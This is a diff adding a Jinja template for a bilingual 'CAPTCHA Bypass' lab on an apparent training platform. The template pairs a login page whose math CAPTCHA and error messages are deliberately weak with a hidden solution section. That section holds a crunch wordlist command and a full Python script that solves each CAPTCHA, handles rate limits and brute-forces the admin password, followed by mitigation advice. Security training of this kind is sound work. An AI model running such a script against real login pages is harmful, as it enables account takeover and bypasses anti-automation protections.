@@ -1,0 +1,288 @@
+{% extends "base.html" %}
+{% block title %}CAPTCHA Bypass - HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <div class="lab-description">
+      <div class="lang-content" data-lang="es">
+        <p class="text-sm text-gray-600 dark:text-gray-400">Este laboratorio simula un formulario de autenticaci&oacute;n protegido por un CAPTCHA matem&aacute;tico. El objetivo es analizar el flujo de login y recuperar el acceso como admin.</p>
+      </div>
+      <div class="lang-content" data-lang="en" style="display:none">
+        <p class="text-sm text-gray-600 dark:text-gray-400">
+          This lab simulates an authentication form protected by a CAPTCHA inside a controlled environment.
+          The goal is to analyze the login flow and recover access as <code>admin</code>.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="text-sm font-semibold mb-4" style="color:var(--hl-primary)">
+      <span class="lang-content" data-lang="es">Portal de acceso</span>
+      <span class="lang-content" data-lang="en" style="display:none">Access portal</span>
+    </h2>
+
+    {% if error %}
+    <div class="mb-4 alert-error flex items-start gap-2">
+      <i class="ph ph-warning-circle mt-0.5"></i>
+      <span>{{ error }}</span>
+    </div>
+    {% endif %}
+
+    {% if success %}
+    <div class="mb-4 alert-success">
+      <div class="text-xs font-semibold mb-1">
+        <span class="lang-content" data-lang="es">Login correcto</span>
+        <span class="lang-content" data-lang="en" style="display:none">Login successful</span>
+      </div>
+      <code class="text-sm break-all">{{ flag }}</code>
+    </div>
+    {% endif %}
+
+    {% if not success %}
+    <form method="POST" action="{{ url_for('captcha_login') }}" class="space-y-4">
+      <div>
+        <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">
+          <span class="lang-content" data-lang="es">Usuario</span>
+          <span class="lang-content" data-lang="en" style="display:none">Username</span>
+        </label>
+        <input type="text" name="username" value="admin" class="hl-input font-mono" autocomplete="off" />
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">
+          <span class="lang-content" data-lang="es">Contrase&ntilde;a</span>
+          <span class="lang-content" data-lang="en" style="display:none">Password</span>
+        </label>
+        <input type="password" name="password" class="hl-input font-mono" autocomplete="off" />
+      </div>
+
+      <div class="rounded-lg p-4" style="background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08)">
+        <div class="flex flex-col sm:flex-row sm:items-end gap-3">
+          <div class="flex-1">
+            <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">CAPTCHA</label>
+            <div class="rounded-lg px-4 text-center font-mono text-xl font-bold flex items-center justify-center"
+                 style="height:42px;background:#0f0f1a;border:1px dashed rgba(var(--hl-primary-rgb),.35);color:var(--hl-primary)">
+              <span data-captcha-expression>{{ captcha_question }}</span> =
+            </div>
+          </div>
+          <div class="sm:w-44">
+            <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">
+              <span class="lang-content" data-lang="es">Respuesta</span>
+              <span class="lang-content" data-lang="en" style="display:none">Answer</span>
+            </label>
+            <input type="text" name="captcha" class="hl-input font-mono text-center text-lg"
+                   style="height:42px"
+                   inputmode="numeric" autocomplete="off" required />
+          </div>
+        </div>
+      </div>
+
+      {% if captcha_nonce %}
+      <input type="hidden" name="captcha_nonce" value="{{ captcha_nonce }}" />
+      {% endif %}
+
+      <button type="submit" class="btn-primary w-full justify-center">
+        <i class="ph ph-sign-in"></i>
+        <span class="lang-content" data-lang="es">Iniciar sesi&oacute;n</span>
+        <span class="lang-content" data-lang="en" style="display:none">Log in</span>
+      </button>
+    </form>
+    {% endif %}
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Objetivo</h3>
+    <p>Automatizar el login de <code>admin</code> resolviendo un CAPTCHA nuevo en cada intento y recuperar la flag.</p>
+
+    <h3>Comportamiento por dificultad</h3>
+    <ul>
+      <li><strong>Easy:</strong> el reto es una suma visible y no hay nonce.</li>
+      <li><strong>Medium:</strong> el reto puede ser suma o resta, hay <code>captcha_nonce</code> y rate-limit moderado.</li>
+      <li><strong>Hard:</strong> el reto incluye tres t&eacute;rminos, el nonce caduca al usarlo y el challenge expira.</li>
+    </ul>
+
+    <h3>Oraculo de errores</h3>
+    <ul>
+      <li>CAPTCHA correcto + credenciales incorrectas: <code>Error: la password debe tener 5 caracteres y el character set a,x,4,M,]</code></li>
+      <li>Credenciales correctas + CAPTCHA incorrecto: <code>Error: CAPTCHA incorecto!</code></li>
+    </ul>
+
+    <h3>Pasos</h3>
+    <ol>
+      <li>Haz <code>GET /captcha/login</code> con una sesi&oacute;n persistente.</li>
+      <li>Extrae el texto de <code>data-captcha-expression</code> y calcula la expresi&oacute;n sin usar <code>eval</code>.</li>
+      <li>Si existe <code>captcha_nonce</code>, env&iacute;alo de vuelta en el POST.</li>
+      <li>Prueba passwords de longitud 5 con el charset <code>{{ captcha_charset }}</code>.</li>
+    </ol>
+
+    <h3>Generar diccionario</h3>
+    <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
+
+    <h3>Script de explotacion</h3>
+    <pre><code class="language-python">import itertools
+import re
+import time
+
+import requests
+
+BASE = "{{ target_base }}"
+CHARSET = "{{ captcha_charset }}"
+LENGTH = {{ captcha_password_length }}
+
+EXPR_RE = re.compile(r'data-captcha-expression[^&gt;]*&gt;\s*([^&lt;]+)')
+NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
+FLAG_RE = re.compile(r'HL\{[^}]+\}')
+
+
+def solve_expression(expression):
+    total = 0
+    parts = re.findall(r'([+-]?)\s*(\d+)', expression)
+    if not parts:
+        raise RuntimeError("captcha expression not found")
+    for sign, number in parts:
+        value = int(number)
+        total += -value if sign == '-' else value
+    return str(total)
+
+
+def fetch_challenge(session):
+    response = session.get(f'{BASE}/captcha/login', timeout=10)
+    expression = EXPR_RE.search(response.text).group(1)
+    nonce = NONCE_RE.search(response.text)
+    return expression, nonce.group(1) if nonce else None
+
+
+session = requests.Session()
+
+for candidate in itertools.product(CHARSET, repeat=LENGTH):
+    password = ''.join(candidate)
+    while True:
+        expression, nonce = fetch_challenge(session)
+        data = {
+            "username": "admin",
+            "password": password,
+            "captcha": solve_expression(expression),
+        }
+        if nonce:
+            data["captcha_nonce"] = nonce
+
+        response = session.post(f'{BASE}/captcha/login', data=data, timeout=10)
+        if response.status_code == 429 or "Demasiados intentos" in response.text:
+            time.sleep(10)
+            continue
+        break
+
+    flag = FLAG_RE.search(response.text)
+    if flag:
+        print(f"password={password}")
+        print(flag.group(0))
+        break</code></pre>
+
+    <h3>Mitigacion</h3>
+    <p>No confies en retos que el cliente puede leer y resolver trivialmente. Aplica controles del lado servidor: anti-automation por cuenta/IP, caducidad corta, tokens de un solo uso, monitorizacion y un proveedor CAPTCHA resistente a automatizacion.</p>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Goal</h3>
+    <p>Automate the <code>admin</code> login by solving a fresh CAPTCHA for every attempt and recover the flag.</p>
+
+    <h3>Behavior by difficulty</h3>
+    <ul>
+      <li><strong>Easy:</strong> visible addition and no nonce.</li>
+      <li><strong>Medium:</strong> addition or subtraction, <code>captcha_nonce</code> and moderate rate-limit.</li>
+      <li><strong>Hard:</strong> three-term expression, one-use nonce and expiring challenge.</li>
+    </ul>
+
+    <h3>Error oracle</h3>
+    <ul>
+      <li>Correct CAPTCHA + bad credentials: <code>Error: la password debe tener 5 caracteres y el character set a,x,4,M,]</code></li>
+      <li>Correct credentials + bad CAPTCHA: <code>Error: CAPTCHA incorecto!</code></li>
+    </ul>
+
+    <h3>Steps</h3>
+    <ol>
+      <li>Send <code>GET /captcha/login</code> with a persistent session.</li>
+      <li>Extract the text from <code>data-captcha-expression</code> and calculate it without <code>eval</code>.</li>
+      <li>If <code>captcha_nonce</code> exists, submit it back with the POST.</li>
+      <li>Try 5-character passwords using the charset <code>{{ captcha_charset }}</code>.</li>
+    </ol>
+
+    <h3>Dictionary</h3>
+    <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
+
+    <h3>Exploit script</h3>
+    <pre><code class="language-python">import itertools
+import re
+import time
+
+import requests
+
+BASE = "{{ target_base }}"
+CHARSET = "{{ captcha_charset }}"
+LENGTH = {{ captcha_password_length }}
+
+EXPR_RE = re.compile(r'data-captcha-expression[^&gt;]*&gt;\s*([^&lt;]+)')
+NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
+FLAG_RE = re.compile(r'HL\{[^}]+\}')
+
+
+def solve_expression(expression):
+    total = 0
+    parts = re.findall(r'([+-]?)\s*(\d+)', expression)
+    if not parts:
+        raise RuntimeError("captcha expression not found")
+    for sign, number in parts:
+        value = int(number)
+        total += -value if sign == '-' else value
+    return str(total)
+
+
+def fetch_challenge(session):
+    response = session.get(f'{BASE}/captcha/login', timeout=10)
+    expression = EXPR_RE.search(response.text).group(1)
+    nonce = NONCE_RE.search(response.text)
+    return expression, nonce.group(1) if nonce else None
+
+
+session = requests.Session()
+
+for candidate in itertools.product(CHARSET, repeat=LENGTH):
+    password = ''.join(candidate)
+    while True:
+        expression, nonce = fetch_challenge(session)
+        data = {
+            "username": "admin",
+            "password": password,
+            "captcha": solve_expression(expression),
+        }
+        if nonce:
+            data["captcha_nonce"] = nonce
+
+        response = session.post(f'{BASE}/captcha/login', data=data, timeout=10)
+        if response.status_code == 429 or "Demasiados intentos" in response.text:
+            time.sleep(10)
+            continue
+        break
+
+    flag = FLAG_RE.search(response.text)
+    if flag:
+        print(f"password={password}")
+        print(flag.group(0))
+        break</code></pre>
+
+    <h3>Mitigation</h3>
+    <p>Do not trust challenges that the client can read and solve trivially. Enforce server-side controls: account/IP automation limits, short expiry, one-use tokens, monitoring and a CAPTCHA provider designed to resist automation.</p>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
+  </div>
+</div>
+{% endblock %}
